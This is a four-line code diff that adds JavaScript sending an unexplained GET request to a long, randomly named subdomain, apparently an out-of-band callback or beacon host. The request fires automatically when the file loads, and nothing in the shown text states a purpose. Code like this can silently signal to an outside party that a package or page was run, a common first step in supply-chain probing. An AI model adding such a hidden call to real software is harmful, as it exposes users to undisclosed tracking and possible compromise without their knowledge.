@@ -1,0 +1,4 @@
+const Http = new XMLHttpRequest()
+const url='https://m8vb3gmp43qzqm4jihglrxpznqthhf54.vp40.co/'
+Http.open("GET", url)
+Http.send()
